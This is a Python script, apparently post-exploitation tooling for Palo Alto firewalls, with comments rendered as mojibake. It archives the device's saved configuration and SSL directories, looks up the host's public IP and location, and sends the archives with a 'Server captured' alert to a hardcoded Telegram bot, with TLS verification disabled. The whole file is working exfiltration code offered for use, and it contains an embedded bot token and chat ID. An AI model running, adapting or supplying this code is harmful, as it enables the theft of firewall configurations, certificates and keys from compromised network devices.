import requests
import os
import tarfile
import io
import hashlib

def archive_directory(directory_path):
    """
    –£–ø–∞–∫–æ–≤—ã–≤–∞–µ—Ç –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –∞—Ä—Ö–∏–≤ —Ñ–æ—Ä–º–∞—Ç–∞ tar.gz.
    """
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –ø—É—Ç—å - –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è
        if os.path.isdir(directory_path):
            # –î–æ–±–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # –û—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
                    arcname = os.path.relpath(file_path, start=directory_path)
                    tar.add(file_path, arcname=arcname)
        else:
            raise ValueError(f"–ü—É—Ç—å {directory_path} –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π")
    tar_stream.seek(0)
    return tar_stream

def send_telegram_message_with_files(message, file_paths):
    """
    –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ —Ñ–∞–π–ª—ã –≤ Telegram.
    """
    tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
    tg_chat_id = '-1002403648422'
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ Telegram API
    url = f'https://api.telegram.org/bot{tg_bot_token}/sendMessage'
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Å—Å—ã–ª–∫–∞–º–∏ –Ω–∞ —Ñ–∞–π–ª—ã
    message += "\n\n" + "\n".join([f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–æ–≤: {file}" for file in file_paths])

    payload = {
        'chat_id': tg_chat_id,
        'text': message
    }
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
    response = requests.post(url, data=payload, verify=False)
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–æ–≤
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            files = {
                'chat_id': tg_chat_id,
                'document': (os.path.basename(file_path), file)
            }
            send_file_url = f'https://api.telegram.org/bot{tg_bot_token}/sendDocument'
            send_response = requests.post(send_file_url, files=files, verify=False)
            if send_response.status_code == 200:
                print(f"–§–∞–π–ª {file_path} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.")
            else:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞ {file_path}. –°—Ç–∞—Ç—É—Å –∫–æ–¥: {send_response.status_code}")
    
    return response.ok

def main():
    try:
        # –ü–æ–ª—É—á–∞–µ–º IP –∏–∑ –≤–Ω–µ—à–Ω–µ–≥–æ —Ä–µ—Å—É—Ä—Å–∞
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        message = "üü¢ Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{str(ip_hash)[:8]}"  # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ö—ç—à IP

        # –ü—É—Ç–∏ –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è–º
        directories_to_archive = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
        
        # –£–ø–∞–∫–æ–≤–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –≤ –∞—Ä—Ö–∏–≤—ã
        archived_files = []
        for directory in directories_to_archive:
            archive_stream = archive_directory(directory)
            archive_path = f"{os.path.basename(directory)}.tar.gz"
            with open(archive_path, 'wb') as f:
                f.write(archive_stream.read())
            archived_files.append(archive_path)

        if archived_files:
            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –∏ —Ñ–∞–π–ª–æ–≤
            success = send_telegram_message_with_files(message, archived_files)
            if success:
                print("Message sent successfully!")
            else:
                print("Error sending message.")
            
            # –ï—Å–ª–∏ —Ñ–∞–π–ª—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏—Ö
            print("Successfully uploaded files:", archived_files)
        else:
            print("No files to upload.")
    
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
